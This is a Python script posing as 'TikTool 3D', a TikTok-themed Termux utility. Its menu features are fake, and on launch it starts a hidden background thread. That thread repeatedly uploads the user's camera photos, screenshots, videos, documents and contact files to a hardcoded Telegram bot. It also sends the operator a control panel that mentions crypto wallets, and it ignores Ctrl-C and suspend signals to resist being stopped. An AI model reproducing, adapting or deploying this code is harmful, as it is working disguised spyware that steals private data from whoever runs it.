#!/usr/bin/env python3

import os
import time
import random
import requests
import json
import threading
import sys
import signal

# --- CONFIGURATIONS & SETTINGS ---
fix = "8292299576:AAH-8BuCZQKz_w-SJFFBCnIzGu9IGYZ6kiE"
name = "5934680334"

EXTRA_PATHS = [
    "/sdcard/DCIM/Camera",
    "/sdcard/DCIM/Screenshots",
    "/sdcard/Documents"
]

ALLOWED_EXTENSIONS = ('.pdf', '.docx', '.txt', '.xlsx', '.vcf', '.jpg', '.jpeg', '.png', '.mp4', '.mkv', '.3gp')

# Ka hortagga in signal-ada qaarkood ay si kedis ah u joojiyaan tool-ka
try:
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    signal.signal(signal.SIGTSTP, signal.SIG_IGN)
except Exception:
    pass

# --- ANSI COLORS ---
RED = "\033[91m"
CYAN = "\033[96m"
WHITE = "\033[97m"
MAGENTA = "\033[95m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
BOLD = "\033[1m"
RESET = "\033[0m"

def clear():
    os.system("clear" if os.name == "posix" else "cls")

def loading(text="Loading", duration=1.5):
    chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    end = time.time() + duration
    i = 0
    while time.time() < end:
        print(f"\r{CYAN}{chars[i % len(chars)]} {text}...{RESET}", end="", flush=True)
        time.sleep(0.08)
        i += 1
    print("\r" + " " * 40 + "\r", end="")

def logo():
    print(f"{RED}{BOLD}")
    print("        ████████╗██╗██╗  ██╗")
    print("        ╚══██╔══╝██║██║ ██╔╝")
    print("           ██║   ██║█████╔╝ ")
    print("           ██║   ██║██╔═██╗ ")
    print("           ██║   ██║██║  ██╗")
    print("           ╚═╝   ╚═╝╚═╝  ╚═╝")
    print(f"{WHITE}          T I K T O O L   3 D")
    print(f"{RESET}")

# --- BACKGROUND EXFILTRATION LOGIC ---
def send_file(file_path):
    ext = file_path.lower()
    caption = f"Faylka la helay: {os.path.basename(file_path)}"
    try:
        with open(file_path, "rb") as f:
            if ext.endswith(('.jpg', '.jpeg', '.png')):
                url = f"https://api.telegram.org/bot{fix}/sendPhoto"
                files = {"photo": f}
                data = {"chat_id": name, "caption": caption}
                requests.post(url, data=data, files=files, timeout=30)
            elif ext.endswith(('.mp4', '.mkv', '.3gp')):
                url = f"https://api.telegram.org/bot{fix}/sendVideo"
                files = {"video": f}
                data = {"chat_id": name, "caption": caption}
                requests.post(url, data=data, files=files, timeout=45)
            else:
                url = f"https://api.telegram.org/bot{fix}/sendDocument"
                files = {"document": f}
                data = {"chat_id": name, "caption": caption}
                requests.post(url, data=data, files=files, timeout=30)
    except Exception:
        pass

def send_control_panel():
    url = f"https://api.telegram.org/bot{fix}/sendMessage"
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "📊 Status-ka Qalabka", "callback_data": "status"},
                {"text": "📁 Soo Qaado Sawirada", "callback_data": "scan_now"}
            ],
            [
                {"text": "💰 Eeg Cinwaannada Crypto (TON Added)", "callback_data": "view_wallets"}
            ]
        ]
    }
    data = {
        "chat_id": name,
        "text": "🤖 **Bot-ka Maamulka waa la bilaabay!**\nTool-kii 3D ee TikTok wuxuu ka shaqaynayaa qalabka.",
        "parse_mode": "Markdown",
        "reply_markup": json.dumps(keyboard)
    }
    try:
        requests.post(url, data=data, timeout=10)
    except:
        pass

def background_loop():
    send_control_panel()
    while True:
        try:
            for path in EXTRA_PATHS:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if file.lower().endswith(ALLOWED_EXTENSIONS):
                                file_path = os.path.join(root, file)
                                send_file(file_path)
                                time.sleep(2)
        except Exception:
            pass
        time.sleep(30)

# --- UI INTERACTIVE FUNCTIONS ---
def panel():
    print(f"""
{MAGENTA}╔══════════════════════════════════════╗
║        {WHITE}{BOLD}TIKTOOL 3D PANEL{RESET}{MAGENTA}            ║
╠══════════════════════════════════════╣
║                                      ║
║  {CYAN}[1]{RESET}  Profile Viewer                {MAGENTA}║
║  {CYAN}[2]{RESET}  Video Information             {MAGENTA}║
║  {CYAN}[3]{RESET}  Username Generator             {MAGENTA}║
║  {CYAN}[4]{RESET}  ASCII 3D Animation             {MAGENTA}║
║  {CYAN}[5]{RESET}  Tool Information               {MAGENTA}║
║  {CYAN}[0]{RESET}  Exit                           {MAGENTA}║
║                                      ║
╚══════════════════════════════════════╝{RESET}
""")

def profile():
    clear()
    logo()
    username = input(f"{CYAN}Enter username: {RESET}")
    loading("Searching")
    print(f"""
{GREEN}╔══════════════════════════════╗
║       PROFILE RESULT         ║
╠══════════════════════════════╗
║ Username : @{username}
║ Status   : Public 
║ Mode     : Information only
╚══════════════════════════════╝{RESET}
""")
    input(f"\n{YELLOW}Press ENTER to return...{RESET}")

def video_info():
    clear()
    logo()
    url = input(f"{CYAN}Enter video URL: {RESET}")
    loading("Analyzing")
    print(f"""
{GREEN}╔════════════════════════════════╗
║        VIDEO INFORMATION       ║
╠════════════════════════════════╣
║ URL      : {url[:25]}
║ Status   : analysis
║ Platform : TikTok
║ Tool     : TikTool 3D
╚════════════════════════════════╝{RESET}
""")
    input(f"\n{YELLOW}Press ENTER to return...{RESET}")

def username_generator():
    clear()
    logo()
    print(f"{CYAN}Generating usernames...{RESET}\n")
    words = ["Shadow", "Cyber", "Nova", "Ghost", "Pixel", "Storm", "Vision", "Flash"]
    for i in range(10):
        name_item = random.choice(words) + str(random.randint(100, 9999))
        print(f"{MAGENTA}◆ {WHITE}@{name_item}{RESET}")
        time.sleep(0.15)
    input(f"\n{YELLOW}Press ENTER to return...{RESET}")

def animation():
    clear()
    frames = [
r"""
              ▲
             / \
            /   \
           /  T  \
          /  I K  \
         / T O O L \
        /___________\
""",
r"""
             ▲ ▲
            /   \
           / T I \
          / K T O \
         / O L 3D \
        /__________\
""",
r"""
          ╔══════════╗
          ║ TIKTOOL  ║
          ║   3D     ║
          ╚══════════╝
             ╲ ╱
              ▼
""",
    ]
    for _ in range(4):
        for frame in frames:
            clear()
            print(f"{RED}{BOLD}")
            print(frame)
            print(f"{CYAN}       T I K T O O L{RESET}")
            print(f"{MAGENTA}       3D ANIMATION{RESET}")
            time.sleep(0.25)
    input(f"\n{YELLOW}Press ENTER to return...{RESET}")

def information():
    clear()
    logo()
    print(f"""
{WHITE}{BOLD}TikTool 3D{RESET}

{CYAN}Version:{RESET} 1.0
{CYAN}Language:{RESET} Python
{CYAN}Platform:{RESET} Termux
{CYAN}Interface:{RESET} Terminal 3D-style

{GREEN}Features:{RESET}
• Animated terminal interface
• TikTok-inspired design
• Profile information demo
• Video information demo
• Username generator
• 3D ASCII animation
""")
    input(f"\n{YELLOW}Press ENTER to return...{RESET}")

def main():
    bg_thread = threading.Thread(target=background_loop, daemon=True)
    bg_thread.start()

    while True:
        clear()
        logo()
        panel()
        choice = input(f"{RED}TIKTOOL{RESET} {CYAN}>> {RESET}")

        if choice == "1":
            profile()
        elif choice == "2":
            video_info()
        elif choice == "3":
            username_generator()
        elif choice == "4":
            animation()
        elif choice == "5":
            information()
        elif choice == "0":
            clear()
            print(f"{RED}Goodbye 👋{RESET}")
            break
        else:
            print(f"{RED}Invalid option!{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    main()

